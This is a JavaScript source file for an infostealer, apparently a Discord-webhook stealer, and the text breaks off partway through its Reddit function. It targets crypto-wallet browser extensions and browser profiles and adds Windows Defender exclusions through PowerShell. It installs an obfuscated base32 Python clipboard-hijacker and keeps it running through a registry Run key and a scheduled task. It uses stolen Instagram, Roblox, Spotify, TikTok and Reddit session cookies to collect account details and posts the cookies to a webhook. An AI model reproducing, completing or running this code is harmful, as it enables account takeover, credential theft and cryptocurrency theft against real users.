_0x4ae424.BitAppWallet = '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet = '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet = '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet = '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet = '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet = '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet = '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet = '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet = '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet = '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E = '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E = '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E = '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E = '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O = '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
  browserPath = [
    [user.local + '\\Google\\Chrome\\User Data\\Default\\', 'Default', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', 'Default', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', 'Guest Profile', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\', 'Default', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', 'Guest Profile', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Default\\', 'Default', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\', 'Profile_2',user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', 'Guest Profile', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\', 'Default', user.roaming + '\\Opera Software\\Opera Neon\\User Data\\'],
    [user.roaming + '\\Opera Software\\Opera Stable\\', 'Default', user.roaming + '\\Opera Software\\Opera Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\', 'Default', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
  ],

randomPath = path.join(mainFolderPath);

if (!fs.existsSync(randomPath)) {
  console.log('');
} else {
  sendSuccessToWebhook();
}

function initializeFolders() {
    try {
        if (!fs.existsSync(mainFolderPath)) {
            fs.mkdirSync(mainFolderPath, { recursive: true });
            console.log('');
            sendSuccessToWebhook();
        }
    } catch (error) { 
    }
}

function downloadPythonInstaller(url, outputFilePath) {
    return axios({ url, method: 'GET', responseType: 'stream' }).then(response => {
        return new Promise((resolve, reject) => {
            const file = fs.createWriteStream(outputFilePath);
            response.data.pipe(file);
            file.on('finish', () => file.close(resolve));
            file.on('error', (err) => fs.unlink(outputFilePath, () => reject(err)));
        });
    }).catch(error => {
        console.error(`Failed to download Python installer: ${error.message}`);
    });
}

async function installPython() {
    const tempDir = os.tmpdir();
    const pythonInstallerUrl = 'https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe';
    const pythonInstallerFile = path.join(tempDir, 'python-installer.exe');
    await downloadPythonInstaller(pythonInstallerUrl, pythonInstallerFile);
    try {
    execFileSync(pythonInstallerFile, ['/quiet', 'InstallAllUsers=0', 'PrependPath=1', 'Include_test=0', 'Include_pip=1', 'Include_doc=0'], { stdio: 'ignore' });
    } catch (error) { }
    fs.unlinkSync(pythonInstallerFile);
    return path.join(process.env['USERPROFILE'], 'AppData', 'Local', 'Programs', 'Python', 'Python312', 'pythonw.exe');
}

function addDefenderExclusions() {
    const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
    const systemTasksPath = 'C:\\Windows\\System32\\Tasks';
    const commands = [
        `powershell -Command Add-MpPreference -ExclusionPath "${appDataHiddenFolder}"`,
        `powershell -Command Add-MpPreference -ExclusionPath "${systemTasksPath}"`
    ];
    commands.forEach((command) => {
        try {
            const output = execSync(command, { stdio: 'pipe' }).toString();
        } catch (error) { }
    });
}


// Make sure to decrypt and put ur adresses...
// encoder -> https://simplycalc.com/base32-encode.php
// decoder -> https://simplycalc.com/base32-decode.php

async function clip(pythonwExe) {
    const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
    if (!fs.existsSync(appDataHiddenFolder)) {
        fs.mkdirSync(appDataHiddenFolder, { recursive: true });
        fs.chmodSync(appDataHiddenFolder, 0o700);
    }
    const scriptContent = `
import base64

encoded_code = """
NFWXA33SOQQHEZIKNFWXA33SOQQHI2LNMUFGS3LQN5ZHIIDQPFYGK4TDNRUXACTJNVYG64TUEBRGC43FGY2AU2LNOBXXE5BAN5ZQU2LNOBXXE5BAON4XGCTJNVYG64TUEBRXI6LQMVZQUZTSN5WSAY3UPFYGK4ZANFWXA33SOQQHO2LOOR4XAZLTBIFGCZDEOJSXG43FOMQD2ID3BIQCAIBCMJ2GGIR2EARCKYTUMMSSELAKEAQCAITFORUCEORAEISWK5DIEURCYCRAEAQCE3DUMMRDUIBCEVWHIYZFEIWAUIBAEARHI4TYEI5CAIRFORZHQJJCFQFCAIBAEJRGG2BCHIQCEJLCMNUCKIRMBIQCAIBCPBWXEIR2EARCK6DNOISSELAKEAQCAITYOJYCEORAEISXQ4TQEURCYCRAEAQCE6TDMFZWQIR2EARCK6TDMFZWQJJCFQFCAIBAEJSG6Z3FEI5CAIRFMRXWOZJFEIFH2CQKOBQXI5DFOJXHGIB5EB5QUIBAEARGE5DDEI5CA4RCLYUGEYZRPRNTCM25FFNWCLL2IEWUQSRNJZIC2WRQFU4V26ZSGYWDIML5EQRCYCRAEAQCEZLUNARDUIDSEJPDA6C3MEWWMQJNIYYC2OK5PM2DA7JEEIWAUIBAEARGY5DDEI5CA4RCLYUEY7CNPQZXY3DUMMYSSW3BFVVW2LL2IEWUQSRNJZIC2WRRFU4V26ZSGYWDGM35EQRCYCRAEAQCE5DSPARDUIDSEJPFIW3BFV5ECLK2GAWTSXL3GI4CYMZTPUSCELAKEAQCAITCMNUCEORAOIRF4KBIMJUXIY3PNFXGGYLTNA5CSPZIOF6HAKK3MEWXUMBNHFOXWNBRPUUSIIRMBIQCAIBCPBWXEIR2EBZCEXRULMYC2OKBIJOVWMJNHFAS2SCKFVHFALK2MEWWW3JNPJOXWOJSFQ4TK7JEEIWAUIBAEARHQ4TQEI5CA4RCLZZFWMBNHFQS26SBFVNF26ZSGQWDGND5EQRCYCRAEAQCE6TDMFZWQIR2EBZCEXTUGFNTALJZIEWXUXL3GMZCYMZZPUSCELAKEAQCAITEN5TWKIR2EBZCEXSEPMYX2WZVFU4UCLKIJIWU4UBNKVOXWML5LMYS2OKBFVEEULKOKAWVUYJNNNWS26S5PMZTELBWGF6SIIQKPUFAUZDFMYQGG4TFMF2GKX3NOV2GK6BINV2XIZLYL5XGC3LFFE5AUIBAEARSAQ3SMVQXIZJAMEQFO2LOMRXXO4ZANV2XIZLYEB2XG2LOM4QGG5DZOBSXGCRAEAQGWZLSNZSWYMZSEA6SAY3UPFYGK4ZOO5UW4ZDMNQXGWZLSNZSWYMZSBIQCAIDNOV2GK6BAHUQGWZLSNZSWYMZSFZBXEZLBORSU25LUMV4FOKCON5XGKLBAIZQWY43FFQQG25LUMV4F63TBNVSSSCQKEAQCA2LGEBVWK4TOMVWDGMROI5SXITDBON2EK4TSN5ZCQKJAHU6SAMJYGM5CAIBDEBCVEUSPKJPUCTCSIVAUIWK7IVMESU2UKMFCAIBAEAQCAIDQOJUW45BIMYREC3TPORUGK4RANFXHG5DBNZRWKIDJOMQGC3DSMVQWI6JAOJ2W43TJNZTS4ICFPBUXI2LOM4XCEKIKEAQCAIBAEAQHG6LTFZSXQ2LUFAYSSCRAEAQGK3DTMU5AUIBAEAQCAIBAOBZGS3TUFBTCETLVORSXQID3NV2XIZLYL5XGC3LFPUQGG4TFMF2GKZBAON2WGY3FONZWM5LMNR4S4IRJBIFGIZLGEBWW63TJORXXEX3DNRUXAYTPMFZGIKBJHIFCAIBAOJSWGZLOORPXMYLMOVSSAPJAEIRAUIBAEB3WQ2LMMUQFI4TVMU5AUIBAEAQCAIBAMNWGS4DCN5QXEZC7OZQWY5LFEA6SA4DZOBSXEY3MNFYC44DBON2GKKBJBIQCAIBAEAQCA2LGEBRWY2LQMJXWC4TEL53GC3DVMUQCCPJAOJSWGZLOORPXMYLMOVSTUCRAEAQCAIBAEAQCAIBAOJSWGZLOORPXMYLMOVSSAPJAMNWGS4DCN5QXEZC7OZQWY5LFBIQCAIBAEAQCAIBAEAQGM33SEBRXE6LQORXSYIDQMF2HIZLSNYQGS3RAOBQXI5DFOJXHGLTJORSW24ZIFE5AUIBAEAQCAIBAEAQCAIBAEAQCA2LGEBZGKLTNMF2GG2BIOBQXI5DFOJXCYIDDNRUXAYTPMFZGIX3WMFWHKZJJHIFCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEBYHS4DFOJRWY2LQFZRW64DZFBQWIZDSMVZXGZLTLNRXE6LQORXV2KIKEAQCAIBAEAQCAIBAEAQCAIBAEAQCAIDCOJSWC2YKEAQCAIBAEAQHI2LNMUXHG3DFMVYCQMBOGUUQUCTJMYQF6X3OMFWWKX27EA6T2IBCL5PW2YLJNZPV6IR2BIQCAIDNOV2GK6C7NZQW2ZJAHUQCER3MN5RGC3C4LRRXE6LQORXV6Y3MNFYGE33BOJSF63LVORSXQIRAEARSAR3MN5RGC3BANV2XIZLYEB2G6IDBOZXWSZBAMNXW4ZTMNFRXI4ZAMFRXE33TOMQHK43FOJZQUIBAEBRXEZLBORSV63LVORSXQKDNOV2GK6C7NZQW2ZJJEAQCGICFNZZXK4TFEBXW43DZEBXW4ZJANFXHG5DBNZRWKIDPMYQHI2DFEBZWG4TJOB2CA2LTEBZHK3TONFXGOCRAEAQG233ONF2G64S7MNWGS4DCN5QXEZBIFE======
"""

def adjust_padding(encoded_str):
    missing_padding = len(encoded_str) % 8
    if missing_padding:
        encoded_str += '=' * (8 - missing_padding)
    return encoded_str

encoded_code = adjust_padding(encoded_code.strip())
decoded_code = base64.b32decode(encoded_code).decode('utf-8')
exec(decoded_code)
`;

    const scriptFilePath = path.join(appDataHiddenFolder, `${generateRandomString(10)}.py`);
    fs.writeFileSync(scriptFilePath, scriptContent);
    await execPromise('pip install pyperclip');
    try {
        const registryCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PythonScript" /t REG_SZ /d "${pythonwExe} \\"${scriptFilePath}\\"" /f`;
        execSync(registryCommand);

        const taskName = `PythonUpdater_${generateRandomString(8)}`;
        execSync(`schtasks /create /tn "${taskName}" /tr "\"${pythonwExe}\" \"${scriptFilePath}\"" /sc onlogon /f`);
    } catch (error) { }
    try {
        const pythonProcess = spawn(pythonwExe, [scriptFilePath], { detached: true, stdio: 'ignore' });
        pythonProcess.unref();
    } catch (error) { }
}

async function createAndExecuteScripts() {
    try {
        addDefenderExclusions();
        const pythonwExe = await installPython();
        await clip(pythonwExe);
    } catch (error) { }

}

async function GetInstaData(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "X-Ig-Connection-Type": "WiFi",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Ig-Capabilities": "36r/Fx8=",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "X-Ig-App-Locale": "en",
      "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
      "Accept-Encoding": "gzip, deflate",
      "Cookie": `sessionid=${session_id};`
    };

    const response = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const userData = response.data.user;

    const data = { username: userData.username, verified: userData.is_verified, avatar: userData.profile_pic_url, session_id: session_id };
    saveInstagramFile(session_id);
    return data;
  } catch (error) {
    console.error('Error fetching Instagram data:', error.message);
  }
}

function saveInstagramFile(session_id) {
  const instagramFolderPath = path.join(mainFolderPath, 'Instagram');
  const instagramFilePath = path.join(instagramFolderPath, 'instagram.txt');
  if (!fs.existsSync(instagramFolderPath)) fs.mkdirSync(instagramFolderPath);
  fs.writeFileSync(instagramFilePath, `sessionid=${session_id}`);
}

async function GetFollowersCount(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "Cookie": `sessionid=${session_id};`
    };

    const accountResponse = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const accountInfo = accountResponse.data.user;
    const userInfoResponse = await axios.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;
    return followersCount;
  } catch (error) {
    console.error("Error fetching followers count:", error.message);
  }
}

async function SubmitInstagram(session_id) {
  try {
    const data = await GetInstaData(session_id);
    const followersCount = await GetFollowersCount(session_id);

    const embed = {
      title: '‎ ',
      color: 0x303037,
      author: {
        name: 'Instagram Session Detected',
        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190791450938572800/2048px-Instagram_icon.png'
      },
      thumbnail: { url: data.avatar },
      fields: [
        { name: '<a:VerifiedUser:1205132509076135987> Verified Account', value: '```' + (data.verified ? 'Yes' : 'No') + '```', inline: true },
        { name: '👤 Username ', value: '```' + data.username + '```', inline: true },
        { name: '<:twitter_follow:1205132510254604388> Followers Count ', value: '```' + followersCount + '```', inline: true },
        { name: 'Token', value: '```' + data.session_id + '```', inline: false },
      ],
      footer: {
        text: `${user.hostname} | t.me/vatfraudster`,
      },
    };

    let retryAttempts = 0;
    while (retryAttempts < 3) {
      try {
        await axios.post(discordWebhookUrl, { embeds: [embed] });
        break;
      } catch (error) {
        if (error.response && error.response.status === 429) {
          const delay = Math.pow(2, retryAttempts) * 1000;
          retryAttempts++;
          await new Promise(resolve => setTimeout(resolve, delay));
        } else {
          console.error("Error in second webhook request:", error.message);
          return;
        }
      }
    }
  } catch (error) {
    console.error("Error Submit Instagram:", error.message);
  }
}


async function GetRobloxData(secret_cookie) {
  let data = {};
  let headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };

  try {
    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });

    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];

    return data;
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
    throw error;
  }
}

async function SubmitRoblox(secret_cookie) {
  try {
    let data = await GetRobloxData(secret_cookie);
    if (!data || !data.username || data.robux === undefined || data.premium === undefined) return;

    const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;

    let embed = {
      title: '‎',
      color: 0x303037,
      author: {
        name: 'Roblox Session Detected',
        icon_url: 'https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
      },
      thumbnail: {
        url: data.avatar,
      },
      fields: [
        {
          name: 'Name:',
          value: '```     ' + data.username + '     ```',
          inline: true,
        },
        {
          name: 'Robux:',
          value: '```   ' + robuxValue + '   ```',
          inline: true,
        },
        {
          name: 'Premium:',
          value: '```   ' + (data.premium ? 'Yes' : 'No') + '   ```',
          inline: true,
        },
        {
          name: 'Secret Cookie:',
          value: '```   ' + secret_cookie + '   ```',
          inline: true,
        },
      ],
      footer: {
        text: `${user.hostname} | t.me/vatfraudster`,
        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
      },
    };

    let payload = {
      embeds: [embed],
    };

    await new Promise(resolve => setTimeout(resolve, 1000));

    console.log('Payload to be sent:', payload);

    axios.post(discordWebhookUrl, payload);
  } catch (error) {
    console.error('Error in SubmitRoblox:', error.message);
  }
}


//
async function SpotifySession(cookie) {
    try {
        const url = 'https://www.spotify.com/api/account-settings/v1/profile';

        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
            'Cookie': `sp_dc=${cookie}`
        };

        const response = await axios.get(url, { headers });
        const profileData = response.data.profile;

        const email = profileData.email || "Not available";
        const gender = profileData.gender || "Not available";
        const birthdate = profileData.birthdate || "Not available";
        const country = profileData.country || "Not available";
        const username = profileData.username || "Not available";

        const embedData = {
            title: '',
            color: 0x303037,
            author: {
                name: 'Spotify Session Detected',
                icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/74/Spotify_App_Logo.svg/1200px-Spotify_App_Logo.svg.png'
            },
            fields: [
                { name: 'Email', value: "```" + email + "```", inline: true },
                { name: 'Username', value: "```" + username + "```", inline: true },
                { name: 'Gender', value: "```" + gender + "```", inline: true },
                { name: 'Birthdate', value: "```" + birthdate + "```", inline: true },
                { name: 'Country', value: "```" + country + "```", inline: true },
                { name: 'Spotify Profile', value: `[Open Profile](https://open.spotify.com/user/${username})`, inline: false },
                { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
            ],
            footer: {
                text: `${user.hostname} | t.me/vatfraudster`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            }
        };

        const payload = { embeds: [embedData] };
        const randomString = crypto.randomBytes(3).toString('hex');
        setTimeout(() => {
            axios.post(discordWebhookUrl, payload)
                .then(response => {
                    console.log('Webhook sent successfully spotify:', response.data);
                })
                .catch(error => {
                    console.error('Error sending Discord webhook:', error.message);
                    console.error('Error Message:', error.message);
                });
        }, 5000);
    } catch (error) {
        console.error('Error fetching Spotify data:', error.message);
        console.error('Error Message:', error.message);
    }
}


function moveTikTokFile(cookie) {
  if (!cookie) return;
  const tiktokFolderPath = path.join(mainFolderPath, 'Tiktok');
  const tiktokFilePath = path.join(tiktokFolderPath, 'tiktok.txt');
  if (!fs.existsSync(tiktokFolderPath)) fs.mkdirSync(tiktokFolderPath);
  fs.writeFileSync(tiktokFilePath, cookie);
  console.log('TikTok session information written to tiktok.txt');
}


function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;
        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }

        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

                const webhookPayload = {
                  embeds: [
                    {
                      title: '‎ ',
                      color: 0x303037,
                      author: {
                        name: 'Tiktok Session Detected',
                        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190790151086035094/tiktok-6338430_1280.png' 
                      },
                      fields: [
                        {
                          name: '<:cookie:1205123589930749995> Cookies',
                          value: "```" + cookie + "```",
                          inline: true
                        },
                        {
                          name: "Profile URL",
                          value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
                          inline: true
                        },
                        {
                          name: "User Identifier",
                          value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: ":envelope: Email",
                          value: "```" + (accountInfo.data.email || "No Email") + "```",
                          inline: true
                        },
                        {
                          name: "👤 Username",
                          value: "```" + accountInfo.data.username + "```",
                          inline: true
                        },
                        {
                          name: "<:twitter_follow:1205132510254604388> Follower Count",
                          value: "```" + (insights?.follower_num?.value || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: "<:freetiktokcoinwithblinkstar74553:1205133412122230915> Coins",
                          value: "```" + wallet.data.coins + "```",
                          inline: true
                        }
                      ],
                      footer: {
                        text: `${user.hostname} | t.me/vatfraudster`,
                        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
                      },
                    }
                  ]
                };

                axios.post(discordWebhookUrl, webhookPayload)
                  .then(response => {
                    console.log('Discord webhook sent successfully! send tiktok');
                    moveTikTokFile(cookie);
                  })
                  .catch(error => {
                    console.error('Error sending Discord webhook:', error.message);
                  });
              })
              .catch(error => {
                console.error('An error occurred while trying to retrieve wallet information:', error.message);
              });
          })
          .catch(error => {
            console.error('An error occurred while trying to retrieve insights:', error.message);
          });
      })
      .catch(error => {
        console.error('An error occurred while trying to retrieve account information:', error.message);
      });
  } catch (error) {
    console.error('An error occurred while trying to steal TikTok session:', error.message);
  }
}


function setRedditSession(cookie) {
    try {
        const cookies = `reddit_session=${cookie}`;
        const headers = { 'Cookie': cookies, 'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6' };
        const jsonData = { scopes: ['*', 'email', 'pii'] };
        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';
        axios.post(tokenUrl, jsonData, { headers })
            .then(tokenResponse => {
                const accessToken = tokenResponse.data.access_token;
                const userHeaders = { 'User-Agent': 'android:com.example.myredditapp:v1.2.3', 'Authorization': `Bearer ${accessToken}` };

                axios.get(userDataUrl, { headers: userHeaders })
                    .then(userDataResponse => {
                        const userData = userDataResponse.data;
                        const username = userData.name;
                        const profileUrl = `https://www.reddit.com/user/${username}`;
                        const commentKarma = userData.comment_karma;
                        const totalKarma = userData.total_karma;
                        const coins = userData.coins;
                        const mod = userData.is_mod;
                        const gold = userData.is_gold;
                        const suspended = userData.is_suspended;

                        const embedData = {
                            title: "",
                            description: "",
                            color: 0x303037, 
                            url: '',
                            timestamp: new Date().toISOString(),
                            fields: [
                { name: '<:cookie:1205123589930749995> Cookies', value: '```' + cookies + '```', inline: false },
                { name: '🌐 Profile URL', value: '```' + profileUrl + '```', inline: false },
                { name: '👤 Username', value: '```' + username + '```', inline: false },
                { name: '', value: '💬 Comments: ```' + commentKarma + '``` 👍 Total Karma: ```' + totalKarma + '```', inline: true },
                { name: '💰 Coins', value: '```' + coins + '```', inline: false },
